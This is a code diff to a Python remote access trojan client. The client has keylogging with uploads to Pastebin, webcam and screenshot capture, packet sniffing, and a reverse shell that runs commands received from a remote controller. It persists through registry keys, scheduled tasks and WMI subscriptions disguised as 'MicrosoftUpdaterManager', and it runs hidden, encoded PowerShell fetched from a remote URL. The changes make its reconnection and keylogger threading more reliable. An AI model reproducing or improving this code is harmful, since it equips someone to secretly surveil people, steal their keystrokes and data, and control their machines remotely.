@@ -115,26 +115,36 @@ class Client(object):
             fx.platforms = ['win32','darwin']
             fx.options = {'registry_key':True, 'scheduled_task':True, 'wmi_object':True, 'startup_file':True, 'hidden_file':True} if os.name is 'nt' else {'launch_agent':True, 'hidden_file':True}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
-            mx.update({fx.func_name: fx})
+            if fx.status.is_set():
+                mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
-            fx.options = {'max_bytes': 1024, 'buffer': None, 'window': None}
+            fx.options = {'max_size': 1024, 'buffer': None, 'window': None}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
-            mx.update({fx.func_name: fx})
+            if fx.status.is_set():
+                mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options = {'image': True, 'video': bool()}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
-            mx.update({fx.func_name: fx})
+            if fx.status.is_set():
+                mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
             fx.options = { 'capture':[], 'duration': 300.0}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
-            mx.update({fx.func_name: fx})
+            if fx.status.is_set():
+                mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
-            mx.update({fx.func_name: fx})
+            if fx.status.is_set():
+                mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'upload':
             fx.options = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
             fx.status.set()
@@ -152,7 +162,10 @@ class Client(object):
         elif fx.func_name is 'admin':
             fx.platforms = ['win32']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
+            if fx.status.is_set():
+                cx.update({fx.func_name: fx})
         else:
+            fx.status.set()
             cx.update({fx.func_name: fx})
         return fx
 
@@ -415,7 +428,7 @@ class Client(object):
         for method in self.persistence.options:
             if method not in self._result['persistence']:
                 try:
-                    function = '_persistence_add_{}_{}'.format(*method.split())
+                    function = '_persistence_add_{}'.format(method)
                     result[method] = getattr(self, function)()
                 except Exception as e:
                     result[method] = str(e)
@@ -425,14 +438,19 @@ class Client(object):
         return result
 
     def _diffiehellman(self):
-        g  = 2
-        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-        a  = self._bytes_to_long(os.urandom(self.encryption.options.get('key_size')))
-        xA = pow(g, a, p)
-        self._socket.sendall(self._long_to_bytes(xA))
-        xB = self._bytes_to_long(self._socket.recv(256))
-        x  = pow(xB, a, p)
-        return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
+        if '_socket' in vars(self):
+            g  = 2
+            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            a  = self._bytes_to_long(os.urandom(self.encryption.options.get('key_size')))
+            xA = pow(g, a, p)
+            try:
+                self._socket.send(self._long_to_bytes(xA))
+                xB = self._bytes_to_long(self._socket.recv(256))
+                x  = pow(xB, a, p)
+                return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
+            except socket.error:
+                self._connected.clear()
+                return self._connect()
 
     def _connect(self, host='localhost', port=1337):
         def _addr(a, b, c):
@@ -440,21 +458,29 @@ class Client(object):
             ip  = ab[ab.keys()[0]][0].get('ip')
             if requests.utils.is_ipv4_address(ip):
                 return _sock((ip, c))
+            else:
+                self._print('Target value not an IPv4 address\nRetrying in 5...'.format(_))
+                time.sleep(5)
+                return _addr(a, b, c)
         def _sock(addr):
             s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setblocking(True)
             _  = s.connect_ex(addr)
             if not _:
                 return s
-            self._print('Socket connection failed with error code: {}'.format(_))
-            return _sock(addr)
+            else:
+                self._print('Socket connection failed with error code: {}\nRetrying in 5...'.format(_))
+                time.sleep(5)
+                return _sock(addr)
         try:
             self._socket = _addr(self._long_to_bytes(long(self.__a__)), self._long_to_bytes(long(self.__b__)), port) if bool('__a__' in vars(self) and '__b__' in vars(self)) else _sock((host, port))
             self._dhkey  = self._diffiehellman()
             return self._connected.set()
         except Exception as e:
             self._print('Connection error: {}'.format(str(e)))
-        self._print('Retrying in 10...')
-        time.sleep(10)
+        self._connected.clear()
+        self._print('Retrying in 5...')
+        time.sleep(5)
         return self._connect(host, port)
 
     def _send(self, data, method='default'):
@@ -466,13 +492,13 @@ class Client(object):
             msg = '{}:{}\n'.format(method, ciphertext)
             try:
                 self._socket.sendall(msg)
-            except socket.error: return
+            except socket.error:
+                return self._connected.clear()
             if len(data): return self._send(data, method)
         except Exception as e:
             self._print('Send error: {}'.format(str(e)))
 
     def _receive(self):
-        self._connected.wait()
         try:
             data = ""
             self._socket.setblocking(True)
@@ -481,7 +507,8 @@ class Client(object):
             while "\n" not in data:
                 try:
                     data += self._socket.recv(1024)
-                except socket.error: return
+                except socket.error:
+                    return self._connected.clear()
             data = self._decrypt(data.rstrip()) if len(data) else data
             return data
         except Exception as e:
@@ -559,6 +586,10 @@ class Client(object):
         for target in [_ for _ in targets if _ in self._modules]:
             try:
                 getattr(self, target).im_func.status.clear()
+                for task_name in self._threads:
+                    if target in task_name:
+                        _ = self._threads.pop(task_name, None)
+                        del _
                 output.append(target)
             except Exception as e:
                 return "disable '{}' returned error: '{}'".format(target, str(e))
@@ -765,7 +796,7 @@ class Client(object):
         except Exception as e:
             return 'Upload error: {}'.format(str(e))
 
-    def _run(self):
+    def _run(self, *args, **kwargs):
         tasks = [task for task,module in self._modules.items() if module.status.is_set() if sys.platform in module.platforms]
         for task in tasks:
             self._threads[task] = threading.Thread(target=self._modules[task], name=time.time())
@@ -781,19 +812,26 @@ class Client(object):
     def _reverse_shell(self):
         while True:
             self.shell.status.wait()
-            prompt = "[%d @ {}]> ".format(os.getcwd())
-            self._send(prompt, method='prompt')   
-            data = self._receive()
-            if not data:
-                continue
-            cmd, _, action = bytes(data).partition(' ')
-            if cmd in self._commands:
-                result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
+            if self._connected.is_set():
+                prompt = "[%d @ {}]> ".format(os.getcwd())
+                self._send(prompt, method='prompt')   
+                data = self._receive()
+                if not data:
+                    continue
+                cmd, _, action = bytes(data).partition(' ')
+                if cmd in self._commands:
+                    result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
+                else:
+                    result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                if result and len(result):
+                    result = '\n' + str(result) + '\n'
+                    self._send(result, method=cmd)
             else:
-                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-            if result and len(result):
-                result = '\n' + str(result) + '\n'
-                self._send(result, method=cmd)
+                if 'connecting' not in self._threads:
+                    t = threading.Thread(target=self._connect, name=time.time())
+                    t.setDaemon(True)
+                    self._threads['connecting'] = t
+                    self._threads['connecting'].start()
             for task, worker in self._threads.items():
                 if not worker.is_alive():
                     _ = self._threads.pop(task, None)
@@ -893,32 +931,41 @@ class Client(object):
         
     def _keylogger_helper(self):
         try:
-            mb = int(self.keylogger.options['max_bytes'])
+            self.keylogger.options['buffer'] = tempfile.SpooledTemporaryFile(max_size=self.keylogger.options.get('max_size'), suffix='.txt', delete=False)
+            while True:
+                if self.exit or self.keylogger.options['buffer']._rolled:
+                    break
+                else:
+                    time.sleep(5)
+            result = self._upload_pastebin(self.keylogger.options['buffer'].name)
+            self._result.update({time.ctime(): result})
+            if self.keylogger.status.is_set():
+                self._get_logger().log(40, result, extra={'submodule': 'keylogger'})
+            try:
+                os.remove(self.keylogger.options['buffer'].name)
+            except: pass
+            if self.exit:
+                return
+            return self._keylogger_helper()
         except Exception as e:
-            
-                self._print("Keylogger helper function error: {}c".format(str(e)))
-        self.keylogger.options['buffer'] = tempfile.SpooledTemporaryFile(max_bytes=mb, suffix='.txt', delete=False)
-        while True:
-            if self.exit or self.keylogger.options['buffer']._rolled:
-                break
-            else:
-                time.sleep(5)
-        result = self._upload_pastebin(self.keylogger.options['buffer'].name)
-        self._result.update({time.ctime(): result})
-        if self.keylogger.status.is_set():
-            self._get_logger().log(40, result, extra={'submodule': 'keylogger'})
-        try:
-            os.remove(self.keylogger.options['buffer'].name)
-        except: pass
-        if self.exit:
-            return
-        return self._keylogger_helper()
+            self._print("Keylogger helper function error: {}".format(str(e)))
                 
     def _keylogger_manager(self):
-        self._threads['keylogger_helper'] = threading.Thread(target=self._keylogger_helper, name=time.time())
-        self._threads['keylogger_helper'].start()
+        exists = bool()
+        if 'keylogger_helper' not in self._threads:
+            exists = False
+        else:
+            if self._threads['keylogger_helper'].is_alive():
+                exists = True
+            else:
+                exists = False
+        if not exists:
+            self._threads['keylogger_helper'] = threading.Thread(target=self._keylogger_helper, name=time.time())
+            self._threads['keylogger_helper'].start()
         while True:
             if self._exit:
+                break
+            if not self.keylogger.status.is_set():
                 break
             hm = HookManager()
             hm.KeyDown = self._keylogger_event
@@ -1184,21 +1231,22 @@ class Client(object):
 
     def _persistence_add_wmi_object(self, command=None, name='MicrosoftUpdaterManager'):
         try:
-            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
+            cmd_line = ''
+            if hasattr(self, '__f__'):
                 filename = self._long_to_bytes(long(self.__f__))
-                if not os.path.exists(filename):
-                    return 'Error: file not found: {}'.format(filename)
-                cmd_line = 'start /b /min {}'.format(filename)
+                if os.path.exists(filename):
+                    cmd_line = 'start /b /min {}'.format(filename)
             elif command:
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
-            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-            powershell = requests.get(self._long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
-            self._powershell(powershell)
-            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
-            result = self._powershell(code)
-            if name in result:
-                self._result['persistence']['wmi_object'] = result
-                return True
+            if len(cmd_line):
+                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+                powershell = requests.get(self._long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+                self._powershell(powershell)
+                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
+                result = self._powershell(code)
+                if name in result:
+                    self._result['persistence']['wmi_object'] = result
+                    return True
         except Exception as e:
             self._print('WMI persistence error: {}'.format(str(e)))        
         return False
@@ -1274,25 +1322,7 @@ class Client(object):
 # ----------------- main --------------------------
 
 def main(*args, **kwargs):
-    client = Client(**{
-#            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
-            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-#            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
-            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
-            "__e__": "423224063517525567299427660991207813087967857812230603629111",
-            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
-            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
-            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
-            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
-            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
-            "__v__": "12620",
-	    "__w__": "12095051301478169748777225282050429328988589300942044190524179830808998249050999",
-            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
-            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
-    })
+    client = Client(**kwargs)
     return client
 
-
-if __name__ == '__main__':
-    main()
 
